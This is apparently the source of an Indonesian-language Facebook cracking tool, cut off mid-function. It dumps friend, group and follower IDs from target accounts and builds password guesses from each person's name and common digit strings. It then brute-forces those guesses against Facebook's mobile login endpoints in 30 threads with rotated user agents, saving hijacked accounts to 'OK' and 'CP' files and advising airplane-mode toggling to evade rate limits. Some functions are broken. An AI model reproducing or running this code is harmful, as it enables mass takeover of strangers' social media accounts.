#Boleh Recode Tapi Ijin Dulu Anjing#
#No Whatsapp Author ->
#Jangan DiPerjual Belikan#
#Kalo DiPerjualBelikan Gw Sumpahin Lu Mati Anjing#
#Facebook -> Muhammad Umar Farooq <- #
import requests,bs4,json,os,sys,random,datetime,time,re
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
import threading
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
P = '\033[0;00m'
J = '\033[0;33m'
S = '\033[0;00m'
N = '\x1b[0m'
I ='\033[0;32m'
C ='\033[0;36m'
M ='\033[0;31m'
U ='\033[0;35m'
K ='\033[0;33m'
P='\033[00m'
h='\033[0;90m'
Q="\033[00m"
kk='\033[0;32m'
ff='\033[0;36m'
G='\033[0;36m'
p='\033[00m'
h='\033[0;90m'
Q="\033[00m"
I='\033[0;32m'
II='\033[0;36m'
m='\033[0;31m'
O ='\033[0;33m'
H='\033[0;33m'
b = '\033[0;36m'
war = "[•]"
B = random.choice([U,I,K,b,M])
def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)

dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def clear():
	os.system('clear')
def back():
	login()
def banner():
	clear()
	wel = '>_Hai Brother'
	wel2 = mark(wel, style='cyan')
	sol().print(wel2)
	au=' Banner Nanti Gw Benerin >_Author > Hikmat  >_Facebook > Muhammad Umar Farooq >_Notice > Kalo Crack Jangan Pake Kartu Tsel Karena Sering Dapet Akun Checkpoint'
	pengembang1=nel(au,style="green")
	cetak(nel(pengembang1, title='>_Ingfo Sc'))

def memek():
	banner()
	print('%s 1. >_Token Gratis Bro '%(H))
	print('%s 2. >_Login Ke Script '%(B))
	yu = input('\033[33m>_Pilih : ')
	if yu in ['1','01']:
	  fritoken
	if yu in ['2','02']:
	  login()

def login():
		try:
			token = open('.token.txt','r').read()
			tokenku.append(token)
			try:
				sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
				sy2 = json.loads(sy.text)['name']
				sy3 = json.loads(sy.text)['id']
				sy4 = json.loads(sy.text)['birthday']
				menu()
			except KeyError:
				login_lagi()
			except requests.exceptions.ConnectionError:
				banner()
				li = '>_Koneksi Internet Bermasalah'
				lo = mark(li, style='red')
				sol().print(lo, style='cyan')
				exit()
		except IOError:
			login_lagi()      
	
def login_lagi():
	banner()
	sky = '>_Token Facebook '
	sky2 = mark(sky, style='green')
	sol().print(sky2, style='cyan')
	panda = input('\033[33m>_Token Fb : ')
	akun=open('.token.txt','w').write(panda)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes3 = json.loads(tes.text)['id']
		sue = '>_Login Sukses '
		suu = mark(sue, style='green')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		menu_test()
	except KeyError:
		sue = '>_Login Gaga '
		suu = mark(sue, style='red')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		memek()
	except requests.exceptions.ConnectionError:
		li = '>_Koneksi Internet Bermasalah'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
		
def menu_test():
	jalan('Wait....... ')
	print('>_Selamat Datang')
	print('[01]>_Menu Crack Facebook/Set Useragent/CheckAPK')
	print('[02]>_Menu BOT')
	print('[00]>_Exit') 
	kanjut = input('>_Pilih  :')
	if kanjut in ['1','01']:
		krekefbi()
	elif kanjut in ['2','02']:
		bottzy()
	elif kanjut in ['0','00']:
		os.system('rm -rf .token.txt')
		print('\033[33m>_Tunggu ...')
		jalan('>_Berhasil Keluar')
		exit()
		
def krekefbi():
	banner()
	print('[Token>>>> :  '+str(tokenku)) 
	print('[01]>_Crack ID Public')
	print('[02]>_Crack ID Public [Massal]')
	print('[03]>_Crack ID Grup')
	print('[04]>_Crack ID Followers')
	jalan('>_Menu Set Useragent')
	print('[05]>_Set UserAGENT')
	jalan('>_Menu CheckOpsi/Hasil OK CP')
	print('[06]>_Check Opsi Hasil Checkpoint')
	print('[07]>_Cek Hasil Crack OK/CP')
	print('[08]>_Check Opsi Hasil OK')
	print('[00]>_Exit') 
	badag = input('>_Pilih. :  ')
	if badag in ['1','01']:
		jancok()
	elif badag in ['2','02']:
		coy()
	elif badag in ['3','03']:
		bangsat()
	elif badag in ['4','04']:
		lonte()
	elif badag in ['5','05']:
		tua()
	elif badag in ['6','06']:
		muda()
	elif badag in ['7','07']:
		pedo()
	elif badag in ['8','08']:
		nanut()
	elif badag in ['0','00']:
		menu_test()
	
def jancok():
	dump_publik()
def coy():
	dump_masal()
def bangsat():
	grup()
def lonte():
	follower
def tua():
	useragent()
def muda():
	result()
def pedo():
	file()
def nanut():
	cek_opsit(okc)
	
def bottzy():
	jalan('>_Menu BOT') 
	print('[01]>_BOT Share')
	print('[00]>_Exit')
	jadah = input('>_Pilih :  ')
	if jadah in ['1','01']:
		kanjoed()
	elif jadah in ['0','00']:
		menu_test()
	
def kanjoed():
	main()

def menu():
	try:sh = requests.get('https://httpbin.org/ip').json()
	except:sh = {'origin':'-'}
	try:
		tglx = my_birthday.split('/')[1]
		blnx = dic2[str(my_birthday.split('/')[0])]
		thnx = my_birthday.split('/')[2]
		birth = tglx+' '+blnx+' '+thnx
	except:birth = '-'
	banner()
	sg = '>_Menu Tools Crack Facebook'
	fx = mark(sg, style='red')
	sol().print(fx)
	#print(x+'['+h+'•'+x+'] \033[0;33m>_Nama Kamu  : '+str(my_name))
	#print(x+'['+h+'•'+x+'] \033[0;33m>_ID Kamu    : '+str(my_id))
	#print(x+'['+h+'•'+x+'] \033[33m>_Tanggal Kamu  : '+str(birth))
	#print(x+'['+h+'•'+x+'] \033[33m>_IP Kamu   : '+str(sh['origin']))
	io = '\x1b[1;95m[01] >_Crack Dari Pertemanan Publik\n\x1b[1;95m[02] >_Crack ID Dari Akun Publik (Massal) \n\x1b[1;95m[03] >_Crack Dari Grup\n\x1b[1;95m[04] >_Bot Share Fb\n\x1b[1;95m[05] >_Crack Follower Fb\n\x1b[1;95m[06] >_Cek Hasil Crack\n\x1b[1;95m[07] >_Ganti User Agent\n\033\x1b[1;95m[08] >_Cek Hasil Crack[09] >_Dump ID [Error] [00] >_Keluar [10]>_Masih Diperbaiki'
	oi = nel(io, style='cyan')
	cetak(nel(oi, title='>_Pilih 1 Sampai 8'))
	jh = input('\033[33m>_Pilih : ')
	if jh in ['1','01']:
		dump_publik()
	elif jh in ['2','02']:		
		dump_massal()
	elif jh in ['3','03']:
		grup()
	elif jh in ['4','04']:
		 main()
	elif jh in ['5','05']:
		follower()
	elif jh in ['6','06']:
		result()
	elif jh in ['7','07']:
		useragent()
	elif jh in ['8','08']:
		file()
	elif jh in ['9','09']:
		dump()
	#elif jh in ['10','0010']:
		#fritoken()
	elif jh in ['0','00']:
		os.system('rm -rf .token.txt')
		print('\033[33m>_Tunggu ...')
		time.sleep(1)
		sw = '>_Berhasil Keluar'
		sol().print(mark(sw, style='green'))
		exit()
	else:
		ric = '>_Pilih Yang Benar'
		sol().print(mark(ric, style='red'))
		exit()

#def dump():
	try:
		it = input('%s[%s•%s] %sID Target : '%(O,P,O,P))
		try:
			token = open('token.txt','r').read()
			mm = requests.get('https://graph.facebook.com/v4.0/%s/friends?&access_token=%s'(it,token))
			print ('%s[%s•%s] %sName : %s'%(O,P,O,P,mm['name']))
		except (KeyError,IOError):
			jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
			menu_lagi()
		tt=[]
		te=[]
		lim = input('%s[%s•%s] %sLimit Dump : '%(O,P,O,P))
		print('%s>_%s'%(O,P))
		ada = requests.get('https://graph.facebook.com/v4.0/%s/friends?limit=%s&access_token=%s'(it,lim,token))
		idi = json.loads(ada.text)
		for x in idi['data']:
			tt.append(x['id'])
		for id in tt:
			try:
				ada2 = requests.get('https://graph.facebook.com/v4.0/%s/friends?&access_token=%s'(id,token))
				idi2 = json.loads(ada2.text)
				try:
					for b in idi2['data']:
						te.append(b['id'])
				except KeyError:
					print('[!] Private')
				print('[•]',id,'•',len(te))
				te.clear()
			except KeyError:
				print('[!] Spam Accounts')
		print('║')
		input('kembali') 
		menu()
	except:pass
def result():
	cek = '>_Cek Hasil Crack'
	sol().print(mark(cek, style='green'))
	kayes = '[01] >_Cek Hasil Cp\n[02] >_Cek Hasil Ok\n[00] >_Kembali Ke Menu'
	kis = nel(kayes, style='cyan')
	cetak(nel(kis, title='>_Hasil'))
	kz = input('\033[33m>_Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			gada = '>_Tidak Ada Hasil'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '>_Tidak Ada Hasil'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '>_Hasil Checkpoint'
			sol().print(mark(gerr, style='green'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '>_Pilih Hasil Untuk Ditampilkan'
			sol().print(mark(gerr2, style='green'))
			geeh = input(' >_Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '>_Pilihan Tidak Ada'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				hehe = '>_File Tidak Ditemukan'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '>_List Akun Checkpoint Kamu'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd CP && cat '+geh)
			akun2 = '>_List Akun Checkpoint Kamu'
			sol().print(mark(akun, style='green'))
			input('\033[33m>_Kembali')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			gada = '>_Direktori Tidak Ditemukan'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '>_Tidak Ada Hasil OK'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '>_Hasil OK Kamu'
			sol().print(mark(gerr, style='green'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			gerr2 = '>_Pilih Hasil Untuk Ditampilkan'
			sol().print(mark(gerr2, style='green'))
			geeh = input('\033[33m>_Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '>_Pilihan Tidak Ada Dimenu'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				hehe = '>_File Tidak Ditemukan'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '>_Hasil Akun OK Kamu'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd OK && cat '+geh)
			akun2 = '>_Hasil Akun OK Kamu'
			sol().print(mark(akun, style='green'))
			input('>_Kembali')
			back()
	elif kz in ['0','00']:
		back()
	else:
		ric = '>_Pilihan Tidak Ada Dimenu'
		sol().print(mark(ric, style='red'))
		exit()

def file():
	tek = '>_Check Opsi'
	sol().print(mark(tek, style='cyan'), style='on red')
	print('\033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	teks = '>_Pilih File Yang Akan Dicek'
	sol().print(mark(teks, style='green'))
	my_files = []
	try:
		lis = os.listdir('CP KONTOL')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		yy = '>_Tidak Ada Hasil Untuk Dicek'
		sol().print(mark(yy, style='red'))
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		teks2 = '>_Pilih File Yang Alan Dicek'
		sol().print(mark(teks2, style='green'))
		geeh = input(x+'['+p+'f'+x+'] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '>_Pilihan Tidak Ada Dimenu'
			sol().print(mark(ric, style='red'))
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				hehe = '>_File Tidak Ditemukan'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()

def dump_publik():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	win = '>_Crack ID Public'
	win2 = mark(win, style='cyan')
	sol().print(win2)
	print('\033[33m>_Ketik "me" Jika Ingin Dump ID Dari Teman')
	pil = input('\033[33m>_Masukkan ID Facebook : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v4.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print('\033[33m>_Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '>_Koneksi Internet Bermasalah'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '>_Pertemanan Private Atau Token Rusak'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()

# DUMP ID MASSAL
def dump_masal():
	win = '# DUMP ID PUBLIK MASSAL'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] MASUKKAN JUMLAH ID (LIMIT 10)')
	try:
		jum = int(input(x+'['+p+'f'+x+'] BERAPA ID : '))
	except ValueError:
		pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
		pesan2 = mark(pesan, style='red')
		sol().print(pesan2)
		exit()
	if jum<1 or jum>100:
		pesan = '# OUT OF RANGE MEN'
		pesan2 = mark(pesan, style='red')
		sol().print(pesan2)
		exit()
	ses=requests.Session()
	yz = 0
	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	tot = '# BERHASIL MENGUMPULKAN %s ID'%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style='red')
	else:
		tot2 = mark(tot, style='green')
	sol().print(tot2)
	setting()


def setting():
	wl = '>_Set Urutan ID'
	sol().print(mark(wl, style='cyan'))
	teks = '[01] >_Crack Dari Akun Tua (None)\n[02] >_Crack Dari Akun Muda (None)'
	tak = nel(teks, style='cyan')
	cetak(nel(tak, title='>_Set'))
	hu = input('\033[33m>_Pilih : ')
	if hu in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif hu in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
	
	else:
		ric = '>_Pilihan Tidak Ada Dimenu'
		sol().print(mark(ric, style='red'))
		exit()
	met = '>_Pilih Methods Crack'
	sol().print(mark(met, style='cyan'))
	ioz = '[01] >_Methode B-Api\n[02] >_Methode Mobile\n[03] >_Methode Mbasic\n[04]>_Methode Touch [New]\n[05]>_Methode FB X [New]\n[06]>_Methode Free FB [New]'
	gess = nel(ioz, style='cyan')
	cetak(nel(gess, title='>_Methode'))
	hc = input('\033[33m>_Pilih : ')
	if hc in ['1','01']:
		method.append('api')
	elif hc in ['3','03']:
		method.append('Mbasic')
	else:
		method.append('mobile')
		method.append('touch')
		method.append('xfb')
		method.append('free')
	guw = '>_Opsi Crack'
	sol().print(mark(guw, style='cyan'))
	aplik = input('\033[33m>_Tampilkan Aplikasi Terkait ? (y/t) : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	osk = input('\033[33m>_Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
	passwrd()

def passwrd():
	ler = '>_Succes'
	sol().print(mark(ler, style='cyan'))
	krek = '>_Hasil Ok  Disimpan Ke : OK/%s\nHasil Cp Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
	cetak(nel(krek, title='>_CRACK'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['1122334455','1234554321','123456654321','112233445566']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'api' in method:
				pool.submit(crack2,idf,pwv)
			elif 'free' in method:
				pool.submit(crack3,idf,pwv)
			elif 'touch' in method:
				pool.submit(crack4,idf,pwv)
			elif 'xfb' in method:
				pool.submit(crack5,idf,pwv)
			elif 'free' in method:
				pool.submit(crack6,idf=pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	tanya = '>_Check Opsi Crack? '
	sol().print(mark(tanya, style='cyan'))
	woi = input('\033[33m>_Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()

def tahun(fx):
    if len(fx)==15:
        if fx[:10] in ['1000000000']       :tahunz = ' • 2009'
        elif fx[:9] in ['100000000']       :tahunz = ' • 2009'
        elif fx[:8] in ['10000000']        :tahunz = ' • 2009'
        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' • 2009'
        elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' • 2010'
        elif fx[:6] in ['100001']          :tahunz = ' • 2010/2011'
        elif fx[:6] in ['100002','100003'] :tahunz = ' • 2011/2012'
        elif fx[:6] in ['100004']          :tahunz = ' • 2012/2013'
        elif fx[:6] in ['100005','100006'] :tahunz = ' • 2013/2014'
        elif fx[:6] in ['100007','100008'] :tahunz = ' • 2014/2015'
        elif fx[:6] in ['100009']          :tahunz = ' • 2015'
        elif fx[:5] in ['10001']           :tahunz = ' • 2015/2016'
        elif fx[:5] in ['10002']           :tahunz = ' • 2016/2017'
        elif fx[:5] in ['10003']           :tahunz = ' • 2018'
        elif fx[:5] in ['10004']           :tahunz = ' • 2019'
        elif fx[:5] in ['10005']           :tahunz = ' • 2020'
        elif fx[:5] in ['10006','10007','10008']:tahunz = ' • 2021'
        else:tahunz=''
    elif len(fx) in [9,10]:
        tahunz = ' • 2008/2009'
    elif len(fx)==8:
        tahunz = ' • 2007/2008'
    elif len(fx)==7:
        tahunz = ' • 2006/2007'
    else:tahunz=''
    return tahunz

def cek_opsit(okc):
	c = len(ok)
	hu = '>_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='>_Check Opsi'))
	input('\033[33m>_Mulai')
	cek = '>_Proses Check Dimulai'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(b,kes,x))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(okc),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "c_user" in ses.cookies.get_dict().keys():
				ckp()
				print('\r%s >> %s|%s >> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '>_Koneksi Internet Bermasalah'
			sol().print(mark(li, style='red'))
			exit()
	dah = '>_Beres'
	sol().print(mark(dah, style='cyan'))
	exit()

def cek_apk(ckp):
    apk = []
    ses_ = requests.Session()
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
    dat_game = ses_.get(url,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
    dat_game = ses_.get(url2,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    print(ckp+''.join(apk))

def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s >%s< %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,idf,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'>_ID       : {idf} >_PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='>_Checkpoint'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'/'+tahun+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
